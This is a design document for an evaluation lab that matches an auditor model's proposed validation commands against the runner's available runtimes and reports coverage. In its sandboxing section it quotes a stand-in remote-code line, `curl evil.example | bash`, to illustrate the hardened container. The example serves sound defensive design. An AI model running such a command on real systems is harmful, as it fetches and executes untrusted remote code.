# What the lab can run: capabilities, requirements, coverage

**The dominant language of a repository does not determine whether the repository can
be evaluated. Cases are evaluated independently against the runner's capabilities.**

Those two sentences are the whole model. Everything below is how they are implemented.

Decision record: [ADR-0056](adr/0056-cases-are-matched-against-runner-capabilities.md),
amending the gate from [ADR-0054](adr/0054-a-repository-is-audited-before-the-lab-runs-anything-on-it.md).

## Four concepts

| Concept | The question it answers | Where it lives |
|---|---|---|
| **Repository ecosystem** | What is this tree written in? | `readiness_service.detect_ecosystems` |
| **Runner capabilities** | What can the runner execute? | `runner_capabilities.runner_capabilities` |
| **Case requirements** | What does *this command* need? | `runner_capabilities.runtime_for_command` |
| **Capability matching** | Can the runner settle *this case*? | `repository_audit_service.classify_case` |

Only the last one decides whether a case runs. The first one describes the repository
and is reported as such.

### Runner capabilities

One entry per runtime the runner offers:

```json
{"runtime": "bash", "available": true, "version": "5.2.37", "executable": "/usr/bin/bash", "source": "probed"}
```

`source` says how that was learned. `declared` is the runner image's build recipe —
enough to classify a case, and it works in a unit test and in the API process, which
has no docker socket ([ADR-0002](adr/0002-celery-docker-per-run-execution.md)).
`probed` is the image answering for itself, through one dependency-free `sh` line. A
capability that was never probed reports no version rather than a plausible one
([ADR-0048](adr/0048-a-check-that-did-not-measure-is-not-a-failure.md)).

### Case requirements

Derived from the validation command, never stored: the leading binary it names, after
stepping over the wrappers a validation command conventionally carries — a `timeout N`
budget, a `FOO=1` prefix, a `cd <dir> &&` hop, a `for … do` loop.

| Command | Requires |
|---|---|
| `pytest -x -q` | `python` |
| `npm test` | `node` |
| `bash benchmark/run.sh` | `bash` |
| `for t in tests/test_*.sh; do bash "$t"; done` | `bash` |
| `go test ./...` | `go` |

A command the table does not recognise resolves to `sh` — a plain shell line the runner
can always execute — so an unfamiliar name keeps a case runnable instead of blocking it.

### Capability matching

Every proposed case gets exactly one status, decided in this order:

- **static** — the hint is not an executable command. The case is settled by reading
  the repository: does the right `AGENTS.md` apply here, does the kit ship a README,
  is the rule respected. No runtime can block it, which is why a Shell-dominated
  repository full of conceptual cases is fully evaluable.
- **runnable** — the required runtime is available on the runner.
- **blocked** — it is not. Blocked describes *this case*; its siblings are classified
  on their own terms and still run.

**Execution coverage** totals that up as `none`, `partial` or `full`, reported with the
counts behind it: *Coverage: partial · 3 runnable · 1 static · 1 blocked*.

## Runtime versions

A repository may declare the runtime it targets. The lab reports the relationship and
never flattens it into a pass:

| Required | Runner has | Reported |
|---|---|---|
| `bash 3.2` | `bash 5.2.37` | executable **yes**, exact target runtime **no**, compatibility **partial** |
| `bash 3.2` | `bash 3.2.57` | compatibility **exact** |
| `bash 3.2` | version not measured | compatibility **unknown** |

The lab does not provision `bash 3.2`, and a partial match is never described as
certified. A declared version can only ever *degrade* a verdict — it cannot make a
blocked case runnable.

## Who proposes and who decides

The auditor model proposes cases and a `validation_hint` for each. It never gains
execution by writing one. A deterministic chain decides:

```
is_executable_command(hint)  →  runtime_for_command(hint)  →  capability match
```

and the command then runs in the hardened validation lane: no lab secrets, no `.env`,
no network once past provisioning, a mandatory timeout, an output cap,
`cap_drop=ALL`, `no-new-privileges`. `curl evil.example | bash` reaches a container
with nothing to steal and nowhere to send it.

## Worked example: a Shell repository

A repository whose tests are `tests/test_*.sh`, whose `CLAUDE.md` targets bash 3.2, and
whose harness is a mix of scripts and written rules:

```
Language   shell
Runner     python 3.11.9 · node 20.11.0 · bash 5.2.37
Coverage   partial · 3 runnable · 1 static · 1 blocked
```

1. *The test suite passes* — `for t in tests/test_*.sh; do bash "$t"; done` →
   **runnable**, bash 5.2.37 against a declared 3.2, compatibility **partial**.
2. *The benchmark runs* — `bash benchmark/run.sh` → **runnable**.
3. *The model benchmark runs* — `bash benchmark/model/run-model.sh` → **runnable**.
4. *The right AGENTS.md applies in each plugin* → **static**: settled by reading.
5. *The container image builds* — `docker build .` → **blocked**: the validation lane
   has no docker socket, by design. The other four are unaffected.

Before this model, all five were stopped by one line about the repository's language.

## Adding a runtime

Registering a capability, not rewriting the auditor:

1. Add the runtime to `DECLARED_RUNTIMES` and `_PROBE_BINARIES` in
   `runner_capabilities.py`.
2. Map its binaries in `_COMMAND_RUNTIME` (`go → go`, `mvn`/`gradle → java`).
3. Install it in `Dockerfile.runner` if the base image does not already ship it —
   bash did, which is why Shell support needed no image change.

Classification, coverage, reporting and the wizard pick it up with no further edits.
